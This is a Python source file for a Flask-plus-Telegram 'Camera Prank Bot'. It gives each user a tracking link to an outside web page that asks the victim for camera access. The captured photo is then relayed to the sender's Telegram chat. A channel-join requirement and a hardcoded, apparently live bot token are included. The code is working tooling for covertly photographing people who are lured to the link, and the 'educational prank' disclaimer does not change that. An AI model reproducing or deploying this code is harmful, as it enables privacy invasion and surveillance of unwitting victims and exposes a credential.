
from flask import Flask, request
from threading import Thread
from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import CommandHandler, CallbackQueryHandler, CallbackContext, Dispatcher
from io import BytesIO
import base64
import os

BOT_TOKEN = '6515038883:AAF3LfbnrUcQBBWiSYs4qpjQCRNQWUAdG1o'  # Replace this
CHANNEL_USERNAME = '@freeinstagramfollowers_10'  # Replace this
FRONTEND_URL = 'https://hiwhoisthis.netlify.app/'  # Replace with your prank page

RECEIVE_ENDPOINT = '/send-photo'

# === INIT ===
app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)
dispatcher = Dispatcher(bot=bot, update_queue=None, workers=1)
user_links = {}  # user_id => chat_id

# === ROUTES ===
@app.route('/')
def index():
    return "✅ Flask Server Running"

@app.route(RECEIVE_ENDPOINT, methods=['POST'])
def receive_photo():
    data = request.json
    user_id = str(data.get("user_id"))
    img_base64 = data.get("img_base64")

    chat_id = user_links.get(user_id)
    if not (chat_id and img_base64):
        return '❌ Invalid Data', 400

    try:
        # Decode and send image
        base64_data = img_base64.split(",")[1]
        img_data = base64.b64decode(base64_data)
        photo_file = BytesIO(img_data)
        photo_file.name = "photo.jpg"

        bot.send_photo(
            chat_id=chat_id,
            photo=photo_file,
            caption="📸 Image received from your prank link.\n❤️ Team Tasmina"
        )
        return '✅ Photo Sent', 200

    except Exception as e:
        return f'❌ Error sending photo: {str(e)}', 500

# === TELEGRAM BOT ===
def is_user_member(context, user_id):
    try:
        member = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def send_prank_link(context, chat_id, name, user_id):
    prank_link = f"{FRONTEND_URL}?userid={user_id}"
    user_links[str(user_id)] = chat_id

    context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"🎉 Welcome {name}!\n\n"
            "🔐 *Disclaimer:*\nThis is an educational prank tool only.\n\n"
            f"🔗 *Your personal prank link:*\n`{prank_link}`\n\n"
            "📤 Send this to your friends. If they open it and give camera access, you'll receive their image.\n\n"
            "_Team Tasmina_"
        ),
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Open Link", url=prank_link)]
        ])
    )

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    name = update.effective_user.first_name

    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=(
            f"👋 Hello *{name}*, welcome to the Camera Prank Bot by *Team Tasmina*!\n\n"
            "⚠️ This tool is for fun only. Do you accept?",
        ),
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Accept & Continue", callback_data="accept_terms_start")]
        ])
    )

def accept_terms_start(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(context, user_id):
        send_prank_link(context, query.message.chat_id, name, user_id)
    else:
        query.message.reply_text(
            "🚫 Please join our Telegram channel first:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
                [InlineKeyboardButton("✅ I Joined", callback_data="check_join")]
            ])
        )

def check_join(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(context, user_id):
        send_prank_link(context, query.message.chat_id, name, user_id)
    else:
        query.message.reply_text("❌ Still not a member. Please join the channel first.")

# === SETUP ===
def setup_dispatcher():
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CallbackQueryHandler(accept_terms_start, pattern="accept_terms_start"))
    dispatcher.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))

# === RUN ===
def run_flask():
    app.run(host='0.0.0.0', port=8080)

def main():
    setup_dispatcher()
    Thread(target=run_flask).start()

    from telegram.ext import Updater
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(accept_terms_start, pattern="accept_terms_start"))
    dp.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()

    app.run(host="0.0.0.0", port=8080)

